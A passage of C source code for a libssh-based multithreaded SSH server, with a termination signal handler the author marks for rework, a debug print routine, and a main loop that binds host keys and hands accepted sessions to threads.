        struct clientNode *node = malloc(sizeof(*node));
        node->data = pass;
        node->nxt = NULL;
        node->prev = NULL;
        list_add_node(node, current);
        pthread_mutex_unlock(&session_lock);
                
        client_handler(node);
    }

    return NULL;
        
}



// REWORK
void handleTerm(int term){

    struct clientNode *currnode = &first;
    struct clientNode *tmp = currnode;

    while (currnode->nxt != NULL)
    {
        currnode = currnode->nxt;
        list_remove_node(tmp);
        tmp = currnode;
    }
    
    log_info("Server shutting down");
    close_log();
    return;
    printf("Terminating...\n");
    int termTime = 10;
    int curr = 0;
    // Todo: clean up active connections from server.
    //pthread_mutex_lock(&session_lock);
    for (size_t i = 0; i < MAX_CONN; i++)
    {
        if(session_array[i] != NULL){
            printf("TERM: Found active connection at index %lu\n", i);
            while(session_array[i] != NULL){
                if(termTime > curr){
                    printf("TERM: Waiting for connection to terminate (%d/%d sec)\n", curr, termTime);
                    sleep(1);
                    curr++;
                } else {
                    printf("TERM: Killing connection...\n");
                    ssh_free(session_array[i]);
                }
            }
        }
    }
    //pthread_mutex_unlock(&session_lock);
    exit(-1);

}

void print_clientDat(clientDat *str){
    printf("\n\nID: %s\n", str->id);
    printf("Session address: %p\n", &(str->session));
    printf("Transaction ID: %d\n", str->trans_id);
    printf("Channel address: %p\n", &(str->chan));
    printf("Type: %d\n\n\n", str->type);
}


int main(int argc, char **argv){
    // set up signal handlers
    struct sigaction sigIntHandler;
	struct sigaction sigTermHandler;


	sigIntHandler.sa_handler = handleTerm;
   	sigemptyset(&sigIntHandler.sa_mask);
   	sigIntHandler.sa_flags = 0;

	sigTermHandler.sa_handler = handleTerm;
	sigemptyset(&sigTermHandler.sa_mask);
	sigTermHandler.sa_flags = 0;

   	sigaction(SIGINT, &sigIntHandler, NULL);
    sigaction(SIGTERM, &sigTermHandler, NULL);
    
    // initialize variables
    ssh_session session;
    ssh_bind sshbind;
    int r;
    int opt = 1;
    int quitting = 0;
	int master_socket;
    int ctr = 0;
    pthread_t thread;
    first.data = NULL;
    first.nxt = NULL;
    first.prev = NULL;
    
    // Initialize directories
    misc_serverinit();    

    if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0){   
        perror("Server: Socket Failure");   
        exit(EXIT_FAILURE);   
    }

    if(setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ){   
        perror("Server: Setsockopt Failure");   
        exit(EXIT_FAILURE);   
    }



    sshbind=ssh_bind_new();
    session=ssh_new();

    ssh_options_set(session, SSH_OPTIONS_FD, &master_socket);
	
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
#ifdef HAVE_ARGP_H
    /*
     * Parse our arguments; every option seen by parse_opt will
     * be reflected in arguments.
     */
    argp_parse (&argp, argc, argv, 0, 0, sshbind);
#else
    (void) argc;
    (void) argv;
#endif
#ifdef WITH_PCAP
    set_pcap(session);
#endif

    // bind the listener to the port
    if(ssh_bind_listen(sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(sshbind));
        return 1;
    }
    printf("Server: Bound to listening port\n");
    
    // accept connections
    while (!quitting){
        session=ssh_new();

        r=ssh_bind_accept(sshbind,session);
	    printf("Server: Accepting connection\n");
        if(r==SSH_ERROR){
      	    printf("Error accepting a connection : %s\n",ssh_get_error(sshbind));
      	    return 1;
        }
        if (ssh_handle_key_exchange(session)) {
            printf("ssh_handle_key_exchange: %s\n", ssh_get_error(session));
            return 1;
        }

        // pass connection to handler thread
        if(pthread_create(&thread, NULL, handle_conn, session)){
            printf("Error creating thread\n");
            ssh_disconnect(session);
            break;
        }
    
        thread_array[ctr] = thread;

        	
    }
        
        
    for (size_t i = 0; i < ctr; i++){
        if(pthread_join(thread_array[i], NULL)){
            printf("Failed to join thread at index %lu\n", i);
        }
    }

    ssh_bind_free(sshbind);

#ifdef WITH_PCAP
    cleanup_pcap();
#endif
    ssh_finalize();

    printf("Server: Terminated successfully\n");
    return 0;
}
